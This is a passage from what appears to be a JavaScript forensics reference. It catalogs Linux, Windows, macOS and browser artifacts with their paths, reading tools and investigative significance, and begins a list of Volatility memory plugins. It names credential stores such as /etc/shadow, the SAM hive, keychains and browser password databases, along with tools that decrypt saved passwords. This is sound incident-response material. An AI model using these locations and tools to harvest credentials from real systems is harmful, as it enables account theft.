    { name: "crontab_files", location: "/var/spool/cron/crontabs/ and /etc/cron.*", description: "Scheduled task definitions", tool: "crontab -l / ls -la", significance: "Persistence mechanism for malware and backdoors" },
    { name: "passwd_file", location: "/etc/passwd", description: "User account information", tool: "cat / getent", significance: "Unauthorized user accounts, UID 0 accounts, shell assignments" },
    { name: "shadow_file", location: "/etc/shadow", description: "Password hashes and aging information", tool: "cat (root)", significance: "Password hash analysis, account modification dates" },
    { name: "group_file", location: "/etc/group", description: "Group membership definitions", tool: "cat / getent", significance: "Privilege escalation via group membership (sudo, docker, wheel)" },
    { name: "sudoers", location: "/etc/sudoers and /etc/sudoers.d/", description: "Sudo privilege configuration", tool: "visudo -c / cat", significance: "Privilege escalation configuration, unauthorized sudo rules" },
    { name: "ssh_authorized_keys", location: "~/.ssh/authorized_keys", description: "SSH public keys authorized for login", tool: "cat", significance: "Unauthorized SSH access persistence" },
    { name: "ssh_known_hosts", location: "~/.ssh/known_hosts", description: "Previously connected SSH hosts", tool: "cat", significance: "Lateral movement targets and history" },
    { name: "ssh_config", location: "~/.ssh/config and /etc/ssh/sshd_config", description: "SSH client and server configuration", tool: "cat", significance: "Tunnel configurations, port forwarding, weak crypto settings" },
    { name: "last_log", location: "/var/log/lastlog", description: "Last login information per user", tool: "lastlog", significance: "Last login time, source IP for each user account" },
    { name: "wtmp", location: "/var/log/wtmp", description: "Login/logout records", tool: "last / utmpdump", significance: "Historical login sessions, duration, and source information" },
    { name: "btmp", location: "/var/log/btmp", description: "Failed login attempts", tool: "lastb / utmpdump", significance: "Brute force attacks, password guessing attempts" },
    { name: "utmp", location: "/var/run/utmp", description: "Currently logged-in users", tool: "who / w / utmpdump", significance: "Active sessions at time of acquisition" },
    { name: "proc_filesystem", location: "/proc/", description: "Virtual filesystem exposing process and kernel state", tool: "ls / cat", significance: "Running processes, network connections, loaded modules, memory maps" },
    { name: "proc_net", location: "/proc/net/tcp, /proc/net/udp", description: "Active network connections", tool: "cat / ss / netstat", significance: "Established connections, listening ports, connection states" },
    { name: "systemd_journal", location: "/var/log/journal/", description: "Binary systemd journal logs", tool: "journalctl", significance: "Comprehensive system events with structured data" },
    { name: "apt_history", location: "/var/log/apt/history.log", description: "Package installation and removal history", tool: "cat / grep", significance: "Software installation timeline, unauthorized package installs" },
    { name: "dpkg_log", location: "/var/log/dpkg.log", description: "Low-level package manager log (Debian/Ubuntu)", tool: "cat / grep", significance: "Detailed package state changes with timestamps" },
    { name: "yum_log", location: "/var/log/yum.log", description: "Package manager log (RHEL/CentOS)", tool: "cat / grep", significance: "Package installation activity on Red Hat systems" },
    { name: "hosts_file", location: "/etc/hosts", description: "Static hostname-to-IP mappings", tool: "cat", significance: "DNS hijacking, C2 redirection, ad-hoc name resolution" },
    { name: "resolv_conf", location: "/etc/resolv.conf", description: "DNS resolver configuration", tool: "cat", significance: "DNS server changes indicating MitM or DNS hijacking" },
    { name: "iptables_rules", location: "/etc/iptables/ or iptables-save", description: "Firewall rule configuration", tool: "iptables -L / iptables-save", significance: "Firewall modifications to allow unauthorized traffic" },
    { name: "network_interfaces", location: "/etc/network/interfaces or /etc/sysconfig/network-scripts/", description: "Network interface configuration", tool: "cat / ip addr", significance: "Network configuration changes, promiscuous mode" },
    { name: "fstab", location: "/etc/fstab", description: "Filesystem mount configuration", tool: "cat", significance: "Unauthorized network mounts, persistence via mount options" },
    { name: "rc_local", location: "/etc/rc.local", description: "Legacy startup script", tool: "cat", significance: "Boot-time persistence mechanism for malware" },
    { name: "systemd_units", location: "/etc/systemd/system/ and ~/.config/systemd/user/", description: "Systemd service unit files", tool: "systemctl list-units / cat", significance: "Service-based persistence, malicious service definitions" },
    { name: "tmp_directories", location: "/tmp, /var/tmp, /dev/shm", description: "Temporary file storage", tool: "ls -la / find", significance: "Malware staging areas, exploit artifacts, data staging" },
    { name: "login_defs", location: "/etc/login.defs", description: "Login defaults configuration", tool: "cat", significance: "Password policy, UID/GID ranges, login restrictions" },
    { name: "pam_config", location: "/etc/pam.d/", description: "PAM authentication module configuration", tool: "cat", significance: "Authentication backdoors, PAM module injection" },
    { name: "ld_preload", location: "/etc/ld.so.preload", description: "Shared library preload configuration", tool: "cat", significance: "Rootkit technique: preloading malicious libraries" },
    { name: "modules_loaded", location: "/proc/modules or lsmod", description: "Currently loaded kernel modules", tool: "lsmod / cat /proc/modules", significance: "Rootkit kernel modules, unauthorized drivers" },
    { name: "docker_logs", location: "/var/lib/docker/", description: "Docker container data and logs", tool: "docker logs / inspect", significance: "Container escape artifacts, unauthorized containers" },
    { name: "audit_log", location: "/var/log/audit/audit.log", description: "Linux audit framework log", tool: "ausearch / aureport", significance: "System call auditing, file access, privilege use" },
    { name: "xauth_data", location: "~/.Xauthority", description: "X11 authentication cookies", tool: "xauth list", significance: "X11 session hijacking, display access" },
    { name: "mail_spool", location: "/var/mail/ or /var/spool/mail/", description: "Local email delivery spool", tool: "cat", significance: "Cron job output, system notifications, data exfiltration" },
    { name: "at_jobs", location: "/var/spool/at/", description: "Scheduled at jobs", tool: "atq / cat", significance: "One-time scheduled persistence or delayed execution" },
    { name: "gnupg_dir", location: "~/.gnupg/", description: "GnuPG keyring and configuration", tool: "gpg --list-keys", significance: "Encryption keys, key import history, trust database" },
    { name: "recently_used", location: "~/.local/share/recently-used.xbel", description: "Recently accessed files (GNOME)", tool: "cat / xmllint", significance: "User file access patterns, data access timeline" },
    { name: "trash_directory", location: "~/.local/share/Trash/", description: "Deleted files in trash", tool: "ls -la", significance: "Deleted evidence recovery, anti-forensics detection" },
  ],

  windows: [
    { name: "security_event_log", location: "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", description: "Security-related events (logon, privilege use, audit policy)", tool: "Event Viewer / EvtxECmd / Get-WinEvent", significance: "Authentication, authorization, and security policy events" },
    { name: "system_event_log", location: "C:\\Windows\\System32\\winevt\\Logs\\System.evtx", description: "System component events (services, drivers, hardware)", tool: "Event Viewer / EvtxECmd / Get-WinEvent", significance: "Service installations, system state changes, driver loading" },
    { name: "application_event_log", location: "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx", description: "Application-specific events", tool: "Event Viewer / EvtxECmd / Get-WinEvent", significance: "Application crashes, errors, and security-relevant events" },
    { name: "powershell_event_log", location: "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx", description: "PowerShell script block and module logging", tool: "Event Viewer / Get-WinEvent", significance: "PowerShell command execution, script content, module loads" },
    { name: "sysmon_event_log", location: "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx", description: "Sysmon process, network, and file events", tool: "Event Viewer / Get-WinEvent", significance: "Detailed process creation, network connections, file modifications" },
    { name: "ntfs_mft", location: "$MFT (NTFS Master File Table)", description: "NTFS filesystem metadata for all files", tool: "MFTECmd / Autopsy / FTK", significance: "File creation/modification/access times, deleted file entries" },
    { name: "ntfs_usnjrnl", location: "$UsnJrnl (NTFS Change Journal)", description: "NTFS change journal tracking file operations", tool: "MFTECmd / fsutil usn", significance: "File creation, deletion, rename operations with timestamps" },
    { name: "ntfs_logfile", location: "$LogFile (NTFS Transaction Log)", description: "NTFS transaction log for crash recovery", tool: "LogFileParser", significance: "Recent file system operations, can reveal anti-forensics" },
    { name: "prefetch", location: "C:\\Windows\\Prefetch\\", description: "Application execution prefetch files", tool: "PECmd / WinPrefetchView", significance: "Program execution evidence, run count, last execution time" },
    { name: "amcache", location: "C:\\Windows\\appcompat\\Programs\\Amcache.hve", description: "Application compatibility cache", tool: "AmcacheParser / Registry Explorer", significance: "Program execution, file hashes, installation evidence" },
    { name: "shimcache", location: "SYSTEM registry hive (AppCompatCache)", description: "Application compatibility shim cache", tool: "ShimCacheParser / AppCompatCacheParser", significance: "Evidence of program execution or presence on system" },
    { name: "userassist", location: "NTUSER.DAT (UserAssist key)", description: "ROT13-encoded program execution tracking", tool: "Registry Explorer / UserAssist parser", significance: "GUI program execution count and last run time per user" },
    { name: "shellbags", location: "NTUSER.DAT and UsrClass.dat", description: "Explorer folder view preferences", tool: "ShellBagsExplorer / SBECmd", significance: "Evidence of folder access including deleted/network folders" },
    { name: "recent_docs", location: "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", description: "Recently accessed documents", tool: "Registry Explorer", significance: "Document access history and file type associations" },
    { name: "jump_lists", location: "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\", description: "Application-specific recent file lists", tool: "JLECmd / JumpListExplorer", significance: "File access history per application, includes deleted files" },
    { name: "lnk_files", location: "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\", description: "Windows shortcut files", tool: "LECmd / lnk_parser", significance: "Target file metadata, MAC timestamps, volume serial numbers" },
    { name: "recycle_bin", location: "C:\\$Recycle.Bin\\<SID>\\", description: "Deleted files metadata and content", tool: "RBCmd / Autopsy", significance: "Deleted file recovery, anti-forensics detection" },
    { name: "registry_sam", location: "C:\\Windows\\System32\\config\\SAM", description: "Security Accounts Manager database", tool: "Registry Explorer / SAMParser", significance: "Local user accounts, password hashes, account status" },
    { name: "registry_system", location: "C:\\Windows\\System32\\config\\SYSTEM", description: "System configuration registry hive", tool: "Registry Explorer / RegRipper", significance: "System configuration, services, network settings, timezone" },
    { name: "registry_software", location: "C:\\Windows\\System32\\config\\SOFTWARE", description: "Software configuration registry hive", tool: "Registry Explorer / RegRipper", significance: "Installed software, Run keys, network profiles" },
    { name: "registry_ntuser", location: "C:\\Users\\<user>\\NTUSER.DAT", description: "User-specific registry hive", tool: "Registry Explorer / RegRipper", significance: "User preferences, MRU lists, typed URLs, Run keys" },
    { name: "registry_usrclass", location: "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat", description: "User-specific COM and shell settings", tool: "Registry Explorer / ShellBagsExplorer", significance: "Shellbags, COM object registrations, CLSID associations" },
    { name: "scheduled_tasks", location: "C:\\Windows\\System32\\Tasks\\", description: "Scheduled task XML definitions", tool: "schtasks / Get-ScheduledTask", significance: "Persistence mechanism, scheduled malware execution" },
    { name: "services_registry", location: "SYSTEM\\CurrentControlSet\\Services\\", description: "Windows service definitions", tool: "Registry Explorer / sc query", significance: "Malicious service installations, driver loading" },
    { name: "bits_jobs", location: "BITS database (qmgr0.dat, qmgr1.dat)", description: "Background Intelligent Transfer Service jobs", tool: "bitsadmin / Get-BitsTransfer", significance: "File download/upload persistence, data exfiltration" },
    { name: "wmi_repository", location: "C:\\Windows\\System32\\wbem\\Repository\\", description: "WMI persistent objects database", tool: "PyWMIPersistenceFinder / WMI Explorer", significance: "WMI event subscription persistence (fileless malware)" },
    { name: "thumbs_db", location: "Thumbs.db / thumbcache_*.db", description: "Thumbnail cache databases", tool: "Thumbcache Viewer / Autopsy", significance: "Evidence of viewed images including deleted files" },
    { name: "windows_search_db", location: "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows.edb", description: "Windows Search index database", tool: "ESEDatabaseView / libesedb", significance: "Indexed file metadata, email content, document text" },
    { name: "srum_db", location: "C:\\Windows\\System32\\sru\\SRUDB.dat", description: "System Resource Usage Monitor database", tool: "SrumECmd / srum-dump", significance: "Application resource usage, network data per process" },
    { name: "activitiescache", location: "C:\\Users\\<user>\\AppData\\Local\\ConnectedDevicesPlatform\\<id>\\ActivitiesCache.db", description: "Windows Timeline activity database", tool: "WxTCmd / DB Browser for SQLite", significance: "Application usage timeline, clipboard history, device sync" },
    { name: "event_trace_logs", location: "C:\\Windows\\System32\\LogFiles\\WMI\\", description: "Event Tracing for Windows (ETW) logs", tool: "tracerpt / ETLParser", significance: "Detailed system and application tracing data" },
    { name: "bam_dam", location: "SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\", description: "Background Activity Moderator", tool: "Registry Explorer", significance: "Program execution evidence with timestamps (Win10+)" },
    { name: "network_profiles", location: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\", description: "Network connection history", tool: "Registry Explorer", significance: "Wi-Fi networks connected, first/last connect times" },
    { name: "typed_urls", location: "NTUSER.DAT\\Software\\Microsoft\\Internet Explorer\\TypedURLs", description: "URLs typed in IE/Edge address bar", tool: "Registry Explorer", significance: "Web browsing history, typed URLs with timestamps" },
    { name: "run_keys", location: "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", description: "Auto-start program entries", tool: "Registry Explorer / Autoruns", significance: "Common persistence location for malware" },
    { name: "startup_folder", location: "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", description: "User startup folder", tool: "dir / Get-ChildItem", significance: "Startup folder persistence for malware" },
    { name: "wer_reports", location: "C:\\ProgramData\\Microsoft\\Windows\\WER\\", description: "Windows Error Reporting crash dumps", tool: "WER parser / dir", significance: "Application crashes from exploitation attempts, memory dumps" },
    { name: "defender_logs", location: "C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\", description: "Windows Defender detection and operational logs", tool: "Get-MpThreatDetection / MPLog parser", significance: "Malware detections, exclusions, tamper attempts" },
    { name: "rdp_bitmap_cache", location: "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\", description: "RDP session bitmap cache", tool: "bmc-tools / RDP Bitmap Cache parser", significance: "Screenshots of RDP sessions showing accessed systems" },
    { name: "pagefile", location: "C:\\pagefile.sys", description: "Virtual memory page file", tool: "strings / Volatility / bulk_extractor", significance: "Memory artifacts persisted to disk, passwords, encryption keys" },
    { name: "hiberfil", location: "C:\\hiberfil.sys", description: "Hibernation file (compressed memory dump)", tool: "Volatility / hibr2bin", significance: "Full memory image from hibernation, process state preservation" },
  ],

  macos: [
    { name: "unified_log", location: "/var/db/diagnostics/", description: "macOS Unified Logging system", tool: "log show / log collect", significance: "Comprehensive system events, process execution, network activity" },
    { name: "asl_logs", location: "/var/log/asl/", description: "Apple System Log (legacy)", tool: "syslog / asl", significance: "System events on older macOS versions (pre-Sierra)" },
    { name: "install_log", location: "/var/log/install.log", description: "Software installation log", tool: "cat / grep", significance: "Application installations, package manager activity" },
    { name: "system_log", location: "/var/log/system.log", description: "General system messages", tool: "cat / grep", significance: "System events, service activity, error messages" },
    { name: "bash_history_mac", location: "~/.bash_history or ~/.zsh_history", description: "Shell command history", tool: "cat / strings", significance: "User command execution history" },
    { name: "launch_agents", location: "~/Library/LaunchAgents/ and /Library/LaunchAgents/", description: "User and system launch agent plists", tool: "launchctl list / plutil", significance: "Persistence mechanism for malware (user-level)" },
    { name: "launch_daemons", location: "/Library/LaunchDaemons/ and /System/Library/LaunchDaemons/", description: "System launch daemon plists", tool: "launchctl list / plutil", significance: "Persistence mechanism for malware (system-level)" },
    { name: "login_items", location: "~/Library/Application Support/com.apple.backgroundtaskmanagementagent/", description: "Login items database", tool: "plutil / sfltool", significance: "Auto-start items on user login" },
    { name: "spotlight_metadata", location: "/.Spotlight-V100/", description: "Spotlight search index", tool: "mdls / mdfind", significance: "File metadata index, content search, deleted file evidence" },
    { name: "quarantine_events", location: "~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2", description: "Gatekeeper quarantine database", tool: "sqlite3", significance: "Downloaded file history with URLs and timestamps" },
    { name: "fseventsd", location: "/.fseventsd/", description: "File System Events daemon log", tool: "FSEventsParser", significance: "File system changes: creation, modification, deletion, rename" },
    { name: "tcc_db", location: "~/Library/Application Support/com.apple.TCC/TCC.db", description: "Transparency, Consent, and Control database", tool: "sqlite3", significance: "Privacy permission grants (camera, microphone, screen recording)" },
    { name: "keychain", location: "~/Library/Keychains/login.keychain-db", description: "User keychain database", tool: "security / Keychain Access", significance: "Stored credentials, certificates, secure notes" },
    { name: "cups_logs", location: "/var/log/cups/", description: "Print system logs", tool: "cat / grep", significance: "Print job history, document names, printer access" },
    { name: "network_prefs", location: "/Library/Preferences/SystemConfiguration/", description: "Network configuration preferences", tool: "plutil / defaults read", significance: "Network interface configs, VPN settings, proxy configs" },
    { name: "wifi_known_networks", location: "/Library/Preferences/com.apple.wifi.known-networks.plist", description: "Known Wi-Fi networks", tool: "plutil / defaults read", significance: "Previously connected Wi-Fi networks and timestamps" },
    { name: "user_accounts_plist", location: "/var/db/dslocal/nodes/Default/users/", description: "User account definitions", tool: "dscl / plutil", significance: "User accounts, password policies, account metadata" },
    { name: "terminal_saved_state", location: "~/Library/Saved Application State/com.apple.Terminal.savedState/", description: "Terminal.app saved window state", tool: "strings / cat", significance: "Terminal window contents from last session" },
    { name: "safari_history", location: "~/Library/Safari/History.db", description: "Safari browsing history", tool: "sqlite3", significance: "Web browsing history with timestamps and visit counts" },
    { name: "safari_downloads", location: "~/Library/Safari/Downloads.plist", description: "Safari download history", tool: "plutil", significance: "File downloads with source URLs" },
    { name: "chrome_history_mac", location: "~/Library/Application Support/Google/Chrome/Default/History", description: "Chrome browsing history (macOS)", tool: "sqlite3", significance: "Web browsing and download history" },
    { name: "notification_db", location: "~/Library/Group Containers/group.com.apple.usernoted/db2/db", description: "Notification center database", tool: "sqlite3", significance: "Application notifications with timestamps and content" },
    { name: "knowledgeC_db", location: "~/Library/Application Support/Knowledge/knowledgeC.db", description: "User activity knowledge database", tool: "sqlite3 / APOLLO", significance: "Application usage, device interactions, activity timeline" },
    { name: "core_analytics", location: "/Library/Logs/DiagnosticReports/", description: "Crash reports and diagnostic data", tool: "cat / plutil", significance: "Application crashes, exploitation evidence" },
    { name: "audit_logs_mac", location: "/var/audit/", description: "BSM audit trail logs", tool: "praudit / auditreduce", significance: "Process execution, file access, authentication events" },
    { name: "time_machine", location: "/Volumes/<backup>/.timemachine/", description: "Time Machine backup snapshots", tool: "tmutil / Finder", significance: "Historical file versions, deleted file recovery" },
    { name: "screencapture", location: "~/Desktop/ or configured location", description: "Screenshots taken by user", tool: "mdls / Finder", significance: "Visual evidence of user activity" },
    { name: "imessage_db", location: "~/Library/Messages/chat.db", description: "iMessage/SMS database", tool: "sqlite3", significance: "Communication history, attachments, contact information" },
    { name: "mail_downloads", location: "~/Library/Mail Downloads/", description: "Email attachment downloads", tool: "ls -la", significance: "Email attachments opened by user" },
    { name: "recent_items", location: "~/Library/Application Support/com.apple.sharedfilelist/", description: "Recent items accessed by user", tool: "plutil / sfltool", significance: "Recently accessed files, servers, and applications" },
    { name: "airdrop_logs", location: "Unified log entries for sharingd", description: "AirDrop transfer logs", tool: "log show --predicate 'subsystem==\"com.apple.sharing\"'", significance: "File transfers via AirDrop with peer information" },
    { name: "xprotect", location: "/Library/Apple/System/Library/CoreServices/XProtect.bundle/", description: "Built-in malware definitions and detections", tool: "plutil / spctl", significance: "Malware detections and Gatekeeper assessments" },
    { name: "mrt_log", location: "/var/log/MRT.log", description: "Malware Removal Tool log", tool: "cat", significance: "Automated malware removal actions by Apple" },
    { name: "airport_log", location: "/var/log/wifi.log", description: "Wi-Fi subsystem log", tool: "cat / grep", significance: "Wi-Fi connection events, AP associations, disconnections" },
    { name: "bluetooth_plist", location: "/Library/Preferences/com.apple.Bluetooth.plist", description: "Bluetooth device history", tool: "plutil", significance: "Paired devices, connection timestamps" },
    { name: "privacy_tcc_system", location: "/Library/Application Support/com.apple.TCC/TCC.db", description: "System-level TCC database", tool: "sqlite3", significance: "System-wide privacy permission grants" },
    { name: "system_policy_db", location: "/var/db/SystemPolicy", description: "Gatekeeper system policy database", tool: "sqlite3 / spctl", significance: "Code signing policy assessments and overrides" },
    { name: "kext_policy_db", location: "/var/db/SystemPolicyConfiguration/KextPolicy", description: "Kernel extension approval database", tool: "sqlite3", significance: "Approved/blocked kernel extensions" },
    { name: "sudo_log_mac", location: "Unified log entries for sudo", description: "Sudo command usage", tool: "log show --predicate 'process==\"sudo\"'", significance: "Privilege escalation via sudo" },
    { name: "coredata_external", location: "~/Library/Application Support/<app>/", description: "CoreData persistent stores", tool: "sqlite3", significance: "Application-specific structured data" },
  ],

  browser: [
    { name: "chrome_history", location: "Default/History (SQLite)", description: "Chrome browsing history database", tool: "sqlite3 / Hindsight", significance: "URLs visited, visit timestamps, visit count, typed URLs" },
    { name: "chrome_downloads", location: "Default/History (downloads table)", description: "Chrome file download records", tool: "sqlite3 / Hindsight", significance: "Downloaded files, source URLs, timestamps, file paths" },
    { name: "chrome_cookies", location: "Default/Cookies (SQLite)", description: "Chrome cookie database", tool: "sqlite3 / ChromeCookiesView", significance: "Session tokens, authentication cookies, tracking data" },
    { name: "chrome_login_data", location: "Default/Login Data (SQLite)", description: "Chrome saved credentials", tool: "sqlite3 / ChromePass", significance: "Saved usernames and encrypted passwords for websites" },
    { name: "chrome_web_data", location: "Default/Web Data (SQLite)", description: "Chrome autofill and form data", tool: "sqlite3", significance: "Autofill entries, credit card data, address information" },
    { name: "chrome_bookmarks", location: "Default/Bookmarks (JSON)", description: "Chrome bookmarks", tool: "cat / jq", significance: "Bookmarked sites, organization structure" },
    { name: "chrome_extensions", location: "Default/Extensions/", description: "Chrome installed extensions", tool: "ls / cat manifest.json", significance: "Malicious extensions, data exfiltration tools" },
    { name: "chrome_local_storage", location: "Default/Local Storage/leveldb/", description: "Chrome local storage database", tool: "LevelDB parser / ccl_chromium_reader", significance: "Web application data, cached credentials, session data" },
    { name: "chrome_session_storage", location: "Default/Session Storage/", description: "Chrome session storage", tool: "LevelDB parser", significance: "Active session data, temporary application state" },
    { name: "chrome_cache", location: "Default/Cache/Cache_Data/", description: "Chrome browser cache", tool: "ChromeCacheView / Autopsy", significance: "Cached web content, images, scripts, API responses" },
    { name: "chrome_favicons", location: "Default/Favicons (SQLite)", description: "Chrome favicon database", tool: "sqlite3", significance: "Evidence of site visits even if history is cleared" },
    { name: "chrome_top_sites", location: "Default/Top Sites (SQLite)", description: "Chrome most visited sites", tool: "sqlite3", significance: "Frequently visited websites" },
    { name: "chrome_shortcuts", location: "Default/Shortcuts (SQLite)", description: "Chrome omnibox shortcuts", tool: "sqlite3", significance: "Search and URL shortcuts typed in omnibox" },
    { name: "chrome_preferences", location: "Default/Preferences (JSON)", description: "Chrome browser preferences", tool: "cat / jq", significance: "Browser configuration, proxy settings, download location" },
    { name: "chrome_sync_data", location: "Default/Sync Data/", description: "Chrome sync database", tool: "sqlite3 / LevelDB parser", significance: "Cross-device synced data, linked Google account" },
    { name: "firefox_places", location: "places.sqlite", description: "Firefox history and bookmarks database", tool: "sqlite3 / Dumpzilla", significance: "Browsing history, bookmarks, annotations with timestamps" },
    { name: "firefox_cookies", location: "cookies.sqlite", description: "Firefox cookie database", tool: "sqlite3 / Dumpzilla", significance: "Session cookies, authentication tokens, tracking cookies" },
    { name: "firefox_formhistory", location: "formhistory.sqlite", description: "Firefox form autofill data", tool: "sqlite3 / Dumpzilla", significance: "Form field entries, search terms, usernames" },
    { name: "firefox_logins", location: "logins.json + key4.db", description: "Firefox saved credentials", tool: "firefox_decrypt / Dumpzilla", significance: "Saved usernames and encrypted passwords" },
    { name: "firefox_downloads", location: "places.sqlite (moz_annos table)", description: "Firefox download history", tool: "sqlite3 / Dumpzilla", significance: "Downloaded files, source URLs, download timestamps" },
    { name: "firefox_extensions", location: "extensions.json", description: "Firefox installed extensions", tool: "cat / jq", significance: "Installed extensions, potential malicious add-ons" },
    { name: "firefox_cache", location: "cache2/entries/", description: "Firefox browser cache", tool: "MozillaCacheView / Autopsy", significance: "Cached web content and resources" },
    { name: "firefox_session_store", location: "sessionstore.jsonlz4", description: "Firefox session restore data", tool: "dejsonlz4 / lz4json", significance: "Open tabs, form data, scroll positions at last session" },
    { name: "firefox_cert_db", location: "cert9.db", description: "Firefox certificate database", tool: "certutil", significance: "Installed certificates, CA trust modifications" },
    { name: "firefox_permissions", location: "permissions.sqlite", description: "Firefox site permissions", tool: "sqlite3", significance: "Site permission grants (camera, location, notifications)" },
    { name: "firefox_content_prefs", location: "content-prefs.sqlite", description: "Firefox per-site preferences", tool: "sqlite3", significance: "Site-specific settings like zoom level" },
    { name: "firefox_webapps", location: "webappsstore.sqlite", description: "Firefox web application storage", tool: "sqlite3", significance: "Local storage data for web applications" },
    { name: "edge_history", location: "Default/History (SQLite, Chromium-based)", description: "Microsoft Edge browsing history", tool: "sqlite3 / BrowsingHistoryView", significance: "URLs visited in Edge with timestamps" },
    { name: "edge_collections", location: "Default/Collections/", description: "Edge Collections data", tool: "LevelDB parser", significance: "Curated content collections by user" },
    { name: "safari_history_db", location: "~/Library/Safari/History.db", description: "Safari browsing history database", tool: "sqlite3", significance: "URL visits, redirects, visit timestamps for Safari" },
    { name: "safari_localstorage", location: "~/Library/Safari/LocalStorage/", description: "Safari local storage", tool: "sqlite3", significance: "Web application local data in Safari" },
    { name: "safari_extensions_mac", location: "~/Library/Safari/Extensions/", description: "Safari installed extensions", tool: "ls / plutil", significance: "Safari browser extensions and their configurations" },
    { name: "safari_tabs", location: "~/Library/Safari/LastSession.plist", description: "Safari last session tabs", tool: "plutil", significance: "Tabs open in last Safari session" },
    { name: "browser_notifications", location: "Various per-browser notification DBs", description: "Browser push notification subscriptions", tool: "sqlite3 / LevelDB parser", significance: "Notification permission grants and subscription data" },
    { name: "service_workers", location: "Default/Service Worker/", description: "Browser service worker registrations", tool: "LevelDB parser / sqlite3", significance: "Registered service workers, cached API responses" },
    { name: "indexeddb", location: "Default/IndexedDB/", description: "Browser IndexedDB databases", tool: "LevelDB parser / IndexedDB parser", significance: "Structured application data, offline storage" },
    { name: "webrtc_logs", location: "Browser-specific WebRTC internals", description: "WebRTC connection logs", tool: "chrome://webrtc-internals / about:webrtc", significance: "Peer-to-peer connections, IP address leaks" },
    { name: "browser_sync_accounts", location: "Various sync configuration files", description: "Browser sync account linkage", tool: "cat / sqlite3", significance: "Linked accounts for cross-device browser sync" },
    { name: "password_manager_db", location: "Various (depends on manager)", description: "Third-party password manager browser data", tool: "Specific to manager", significance: "Stored credentials from password manager extensions" },
    { name: "browser_dns_cache", location: "chrome://net-internals/#dns (runtime)", description: "Browser DNS resolution cache", tool: "chrome://net-internals export", significance: "Recently resolved domains even without history entries" },
  ],
};

// ---------------------------------------------------------------------------
// 3. MEMORY_ANALYSIS -- Volatility plugins
// ---------------------------------------------------------------------------

const MEMORY_ANALYSIS = [
  // Process analysis
  { plugin: "pslist", description: "List running processes from EPROCESS doubly-linked list", usage: "vol.py -f <image> windows.pslist", significance: "Active processes at time of capture; may miss unlinked processes" },
  { plugin: "psscan", description: "Scan physical memory for EPROCESS structures", usage: "vol.py -f <image> windows.psscan", significance: "Finds hidden/unlinked processes that pslist misses (rootkit detection)" },
  { plugin: "pstree", description: "Display process tree showing parent-child relationships", usage: "vol.py -f <image> windows.pstree", significance: "Identify suspicious process hierarchies (e.g., cmd.exe spawned by Word)" },
  { plugin: "psxview", description: "Cross-reference process listings from multiple sources", usage: "vol.py -f <image> windows.psxview", significance: "Detect process hiding by comparing 7+ process enumeration methods" },
  { plugin: "cmdline", description: "Display command line arguments for each process", usage: "vol.py -f <image> windows.cmdline", significance: "Reveal exact commands executed, including encoded PowerShell payloads" },
  { plugin: "consoles", description: "Extract command history from console host processes", usage: "vol.py -f <image> windows.consoles", significance: "Full console I/O history including command output" },
  { plugin: "envars", description: "Display process environment variables", usage: "vol.py -f <image> windows.envars", significance: "Environment modifications, path changes, temp directory locations" },
  { plugin: "getsids", description: "Display Security Identifiers for each process", usage: "vol.py -f <image> windows.getsids", significance: "Process privilege levels, identify processes running as SYSTEM" },
  { plugin: "handles", description: "List open handles (files, registry keys, mutexes, etc.)", usage: "vol.py -f <image> windows.handles --pid <pid>", significance: "Open files, registry keys, synchronization objects per process" },
  { plugin: "dlllist", description: "List loaded DLLs for each process", usage: "vol.py -f <image> windows.dlllist --pid <pid>", significance: "Loaded libraries, DLL injection detection, suspicious DLL paths" },
  { plugin: "ldrmodules", description: "Detect unlinked DLLs by cross-referencing three PEB lists", usage: "vol.py -f <image> windows.ldrmodules", significance: "Detect DLL hiding/unlinking (indicator of injection)" },
  { plugin: "procdump", description: "Dump process executable from memory", usage: "vol.py -f <image> windows.procdump --pid <pid> --dump-dir <dir>", significance: "Extract running executable for static analysis/reverse engineering" },
  { plugin: "memmap", description: "Display memory map of a process", usage: "vol.py -f <image> windows.memmap --pid <pid>", significance: "Virtual memory layout, mapped files, heap locations" },
  { plugin: "vadinfo", description: "Display Virtual Address Descriptor information", usage: "vol.py -f <image> windows.vadinfo --pid <pid>", significance: "Memory region permissions, identify RWX regions (injection indicator)" },
  { plugin: "vadwalk", description: "Walk the VAD tree for a process", usage: "vol.py -f <image> windows.vadwalk --pid <pid>", significance: "Complete virtual memory mapping with protections and types" },
  { plugin: "threads", description: "List threads and their start addresses", usage: "vol.py -f <image> windows.threads", significance: "Orphan threads, threads starting outside module ranges (injection)" },
  { plugin: "privs", description: "Display process token privileges", usage: "vol.py -f <image> windows.privs", significance: "Elevated privileges, SeDebugPrivilege (often used by malware)" },

  // Network analysis
  { plugin: "netscan", description: "Scan for network connections and listening sockets", usage: "vol.py -f <image> windows.netscan", significance: "Active connections, listening ports, C2 communication evidence" },
  { plugin: "netstat", description: "Display active network connections from kernel structures", usage: "vol.py -f <image> windows.netstat", significance: "Network connections with associated process information" },
  { plugin: "connscan", description: "Scan for TCP connections (legacy Windows XP/2003)", usage: "vol.py -f <image> windows.connscan", significance: "TCP connections including closed/terminated ones on older systems" },
  { plugin: "sockscan", description: "Scan for socket objects (legacy Windows XP/2003)", usage: "vol.py -f <image> windows.sockscan", significance: "UDP and raw sockets on older Windows versions" },

  // Registry analysis
  { plugin: "hivelist", description: "List registry hives loaded in memory", usage: "vol.py -f <image> windows.registry.hivelist", significance: "Identify available registry hives for further analysis" },
